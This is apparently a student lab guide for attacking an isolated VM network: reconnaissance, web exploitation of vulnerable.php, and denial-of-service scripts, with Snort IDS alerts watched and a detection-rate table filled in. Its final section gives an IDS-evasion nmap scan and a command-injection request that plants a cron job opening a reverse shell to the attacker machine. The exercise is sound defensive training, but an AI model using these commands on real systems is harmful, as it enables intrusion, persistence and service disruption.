## üöÄ Quick Start Instructions

### Prerequisites Check
‚úÖ **Completed Tasks:**
- [x] Task 1: Apache Web Server Deployed (192.168.56.10)
- [x] Task 2: Snort IDS Installed (192.168.56.11) 
- [x] Task 3: Initial Keylogger/Network Scanning Completed

### Current Status
- **Victim Server:** 192.168.56.10 (Ubuntu + Apache + vulnerable.php)
- **IDS Sensor:** 192.168.56.11 (Ubuntu + Snort monitoring)
- **Attacker Machine:** 192.168.56.12 (Kali Linux)
- **All VMs:** Running and network accessible

---

## üî• Phase 1: Comprehensive Network Reconnaissance

### Step 1.1: Transfer Scripts to Kali
```bash
# On Windows (your host), copy scripts to Kali VM
# The scripts are ready: recon_script.sh, exploit_script.sh, dos_script.sh
```

### Step 1.2: Set Up Monitoring
**Open 2 Terminal Windows:**

**Terminal 1 - IDS Monitoring (SSH to Sensor-IDS):**
```bash
ssh sensor-admin@192.168.56.11
sudo tail -f /var/log/snort/snort.alert.fast
```

**Terminal 2 - Attack Execution (Kali Machine):**
```bash
# Make scripts executable
chmod +x recon_script.sh exploit_script.sh dos_script.sh

# Start with reconnaissance
./recon_script.sh
```

### Step 1.3: Execute Reconnaissance Script
- Script will pause between each attack phase
- Monitor IDS alerts in real-time
- Take screenshots of alert patterns
- Document detection rates and response times

**üì∏ SCREENSHOT OPPORTUNITIES:**
1. Network discovery results (nmap output)
2. IDS alerts showing scan detection
3. Service enumeration results
4. Vulnerability scan findings

---

## üéØ Phase 2: Web Application Exploitation

### Step 2.1: Launch Exploitation Script
```bash
./exploit_script.sh
```

**Attack Sequence:**
1. **Command Injection** - System information gathering
2. **XSS Attacks** - Various payload types
3. **File System Access** - Attempting privilege escalation
4. **Information Harvesting** - Configuration and log access

### Step 2.2: Monitor IDS Response
- Watch for custom rule triggers (SID: 1000001-1000008)
- Document which attacks are detected vs. missed
- Note attack signatures and patterns

**üì∏ SCREENSHOT OPPORTUNITIES:**
1. Command injection successful execution
2. XSS payload responses
3. IDS alerts showing web attack detection
4. System information gathered through vulnerabilities

---

## ‚ö° Phase 3: Denial of Service Testing

### Step 3.1: Prepare DoS Monitoring
**Open 3rd Terminal - Victim Server Resource Monitoring:**
```bash
ssh victim-admin@192.168.56.10
# Monitor system resources during attacks
watch -n 1 "echo '=== CPU/Memory ===' && top -bn1 | head -15 && echo '=== Network ===' && ss -tuln | grep :80"
```

### Step 3.2: Execute DoS Script
```bash
./dos_script.sh
```

**DoS Attack Types:**
1. **HTTP Flood** - Request volume attacks
2. **Connection Exhaustion** - TCP/Keep-alive abuse  
3. **Application DoS** - Resource-intensive commands
4. **Network Layer** - ICMP/UDP floods
5. **Service-Specific** - SSH/HTTP header attacks

### Step 3.3: Document Service Impact
- Monitor web service response times
- Check if services become unavailable
- Measure recovery time after attacks
- Verify IDS detection of DoS patterns

**üì∏ SCREENSHOT OPPORTUNITIES:**
1. DoS attack execution progress
2. System resource consumption (CPU/Memory)
3. Service availability testing results  
4. IDS DoS detection alerts
5. Service recovery verification

## üìä Phase 4: Analysis and Documentation

### Step 4.1: IDS Alert Analysis
```bash
# On Sensor-IDS, analyze attack detection
ssh sensor-admin@192.168.56.11

# Count total alerts generated
sudo wc -l /var/log/snort/snort.alert.fast

# Analyze attack patterns detected
sudo grep -c "Command Injection" /var/log/snort/snort.alert.fast
sudo grep -c "XSS Attack" /var/log/snort/snort.alert.fast  
sudo grep -c "DoS Attack" /var/log/snort/snort.alert.fast
sudo grep -c "SCAN" /var/log/snort/snort.alert.fast

# View latest alerts
sudo tail -20 /var/log/snort/snort.alert.fast
```

### Step 4.2: Victim Server Log Analysis  
```bash
# On Victim Server, check access logs
ssh victim-admin@192.168.56.10

# Web server access patterns
sudo tail -50 /var/log/apache2/access.log | grep vulnerable.php

# Authentication attempts
sudo grep "Failed password" /var/log/auth.log | tail -10

# System resource usage
df -h
free -m
uptime
```

### Step 4.3: Attack Success Rate Documentation
Create a summary table:

| Attack Type | Attempted | Successful | IDS Detected | Detection Rate |
|-------------|-----------|------------|--------------|----------------|
| Network Scan | ‚úÖ | ‚úÖ | ‚úÖ | 100% |
| Command Injection | ‚úÖ | ‚úÖ | ? | ?% |
| XSS | ‚úÖ | ‚úÖ | ? | ?% |
| DoS - HTTP Flood | ‚úÖ | ? | ? | ?% |
| DoS - Connection | ‚úÖ | ? | ? | ?% |

## üé≠ Phase 5: Advanced Techniques (Optional)

### Step 5.1: IDS Evasion Testing
```bash
# Test various evasion techniques
nmap -sS -T1 -f -D RND:5 192.168.56.10  # Slow + fragmented + decoys
curl --user-agent "Mozilla/5.0..." "http://192.168.56.10/vulnerable.php?cmd=whoami"
```

### Step 5.2: Persistence Testing
```bash
# Attempt to establish persistence (will be detected)
curl -s "http://192.168.56.10/vulnerable.php?cmd=echo '* * * * * /bin/bash -i >& /dev/tcp/192.168.56.12/4444 0>&1' | crontab -"
```
